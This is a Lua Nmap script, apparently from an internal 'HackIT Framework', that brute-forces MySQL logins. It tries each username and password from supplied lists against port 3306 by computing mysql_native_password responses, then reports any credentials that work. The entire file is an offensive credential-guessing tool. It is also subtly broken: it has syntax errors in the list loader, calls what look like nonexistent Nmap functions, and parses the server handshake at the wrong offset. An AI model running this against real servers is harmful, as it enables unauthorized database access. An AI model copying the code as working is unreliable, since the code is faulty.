local stdnse = require "stdnse"
local nmap = require "nmap"
local openssl = require "openssl"
local os = require "os"
local shortport = require "shortport"



-- nmp function cache
local nmap_register = nmap.register_script
local nmap_settitle = nmap.set_title
local nmap_resolve = nmap.resolve
local nmap_get_port_state = nmap.get_port_state
local nmap_set_port_state = nmap.set_port_state
local comm = nmap.comm
local new_socket = nmap.new_socket
local get_timeout = nmap.get_timeout

-- Performance optimizations
local format = string.format
local lower = string.lower
local upper = string.upper
local byte = string.byte
local sub = string.sub
local match = string.match
local gmatch = string.gmatch
local gsub = string.gsub
local find = string.find
local rep = string.rep
local char = string.char
local concat = table.concat
local insert = table.insert
local remove = table.remove
local sort = table.sort
local move = table.move or function(a1, f, e, t, a2)
    if not a2 then a2 = a1 end
    for i = f, e do a2[t + i - f] = a1[i] end
    return a2
end
local tostring = tostring
local tonumber = tonumber
local type = type
local pcall = pcall
local pairs = pairs
local ipairs = ipairs
local unpack = unpack or table.unpack
local setmetatable = setmetatable
local getmetatable = getmetatable
local error = error
local select = select
local clock = nmap.clock
local msleep = nmap.msleep
local sleep = stdnse.sleep
local strsplit = stdnse.strsplit
local format_output = stdnse.format_output
local output_table = stdnse.output_table

description = [[Attempts to brute-force MySQL credentials using mysql_native_password authentication.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"brute", "intrusive"}

local function hex_to_bin(s)
  return (s:gsub("..", function(cc) return char(tonumber(cc, 16)) end))
end

local function load_list(arg_names)
  local val = stdnse.get_script_args(arg_names)
  if not val or val == "" then return {} end
  if val:byte() == 47 then
    local f, err = io.open(val, "r")
    if f then
      local lines = {}
      for line in f:lines() do
        line = line:gsub("^%s+", ""):gsub("%s+$", "")
        if line ~= "" and line:byte() ~= 35 then insert(lines, line end)
      end
      f:close()
      return lines
    end
  elseif val:find("\n") then
    local lines = {}
    for line in val:gmatch("[^\n]+") do
      line = line:gsub("^%s+", ""):gsub("%s+$", "")
      if line ~= "" and line:byte() ~= 35 then insert(lines, line end)
    end
    return lines
  end
  local items = {}
  for item in val:gmatch("[^,]+") do
    item = item:gsub("^%s+", ""):gsub("%s+$", "")
    if item ~= "" then insert(items, item) end
  end
  return items
end

local function mysql_native_hash(password, salt)
  local stage1_hex = openssl.sha1(password)
  local stage1 = hex_to_bin(stage1_hex:lower())
  local stage2_hex = openssl.sha1(stage1)
  local stage2 = hex_to_bin(stage2_hex:lower())
  local stage3_hex = openssl.sha1(salt .. stage2)
  local stage3 = hex_to_bin(stage3_hex:lower())
  local result = {}
  for i = 1, 20 do
    result[i] = char(byte(stage1, i) ~ byte(stage3, i))
  end
  return concat(result)
end

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and port.number == 3306 end

action = function(host, port)
  local users = load_list({"brute-mysql.users", "users"})
  local passes = load_list({"brute-mysql.passwords", "passwords"})
  local delay = tonumber(stdnse.get_script_args({"brute-mysql.delay", "delay"}) or 100)
  local max_attempts = tonumber(stdnse.get_script_args({"brute-mysql.max_attempts", "max_attempts"}) or 1000)
  local timeout = tonumber(stdnse.get_script_args({"brute-mysql.timeout", "timeout"}) or 10)
  local stop_on_first = stdnse.get_script_args({"brute-mysql.stop_on_first", "stop_on_first"})
  if stop_on_first == nil or stop_on_first == "" then stop_on_first = true
  else stop_on_first = (stop_on_first:lower() == "true" or stop_on_first == "1") end

  if #users == 0 or #passes == 0 then
    return format_output(false, "No credentials provided. Use brute-mysql.users and brute-mysql.passwords script args")
  end

  local start_time = os.time()
  local found = {}
  local attempts = 0
  local errors = 0
  local success_count = 0
  local stop = false
  local server_version = nil

  for _, u in ipairs(users) do
    if stop then break end
    for _, p in ipairs(passes) do
      if stop or attempts >= max_attempts then break end
      local socket = new_socket()
      socket:set_timeout(timeout * 1000)
      local ok, result = pcall(function()
        local status, err = socket:connect(host, port)
        if not status then errors = errors + 1; return false end
        -- Read MySQL initial handshake packet
        local hb = socket:receive_bytes(128)
        if not hb or #hb < 45 then socket:close(); errors = errors + 1; return false end
        local pos = 2
        local sv = ""
        while pos <= #hb do
          local b = hb:byte(pos)
          if b == 0 then pos = pos + 1; break end
          sv = sv .. char(b)
          pos = pos + 1
        end
        if not server_version then server_version = sv end
        pos = pos + 4
        local part1 = hb:sub(pos, pos + 7); pos = pos + 8
        pos = pos + 1
        pos = pos + 2
        pos = pos + 1
        pos = pos + 2
        pos = pos + 2
        local auth_plugin_data_len = hb:byte(pos); pos = pos + 1
        pos = pos + 10
        local part2_len = auth_plugin_data_len - 8
        if part2_len < 0 then part2_len = 12 end
        local part2 = hb:sub(pos, pos + part2_len - 1)
        local salt = part1 .. part2
        local auth_response = mysql_native_hash(p, salt)
        local client_caps = 0x0a285
        local payload = {}
        local function b3(n) return math.floor(n / 16777216) % 256 end
        local function b2(n) return math.floor(n / 65536) % 256 end
        local function b1(n) return math.floor(n / 256) % 256 end
        payload[1] = char(
          client_caps % 256, b1(client_caps),
          b2(client_caps), b3(client_caps))
        payload[2] = char(255, 255, 255, 0)
        payload[3] = char(33)
        payload[4] = rep(char(0), 23)
        payload[5] = u .. char(0)
        payload[6] = char(#auth_response) .. auth_response
        payload[7] = "mysql_native_password" .. char(0)
        local body = concat(payload)
        local pkt = char(#body % 256, math.floor(#body / 256) % 256, math.floor(#body / 65536) % 256, 1) .. body
        socket:send(pkt)
        local resp_header = socket:receive_bytes(4)
        if not resp_header then socket:close(); return false end
        local resp_len = byte(resp_header, 1) + byte(resp_header, 2) * 256 + byte(resp_header, 3) * 65536
        local resp_body = ""
        if resp_len > 0 then
          local rest, err = socket:receive_bytes(resp_len)
          if rest then resp_body = rest else socket:close(); return false end
        end
        socket:close()
        if #resp_body >= 1 and resp_body:byte(1) == 0x00 then return true end
        return false
      end)
      if not ok then
        pcall(socket.close, socket)
        errors = errors + 1
      elseif result then
        success_count = success_count + 1
        insert(found, {user = u, password = p})
        if stop_on_first then stop = true end
      end
      attempts = attempts + 1
      if delay > 0 and not stop then sleep(delay / 1000) end
    end
  end

  local elapsed = os.time() - start_time
  local out = output_table()
  out.service = "MySQL"
  out.port = port.number
  out.attempts = attempts
  out.success_count = success_count
  out.time_taken = elapsed .. "s"
  if server_version then out.server_version = server_version end
  if #found > 0 then
    out.status = "VULNERABLE"
    out.found_credentials = found
  else
    out.status = "SECURE"
  end
  if errors > 0 then out.errors = errors end
  return out
end
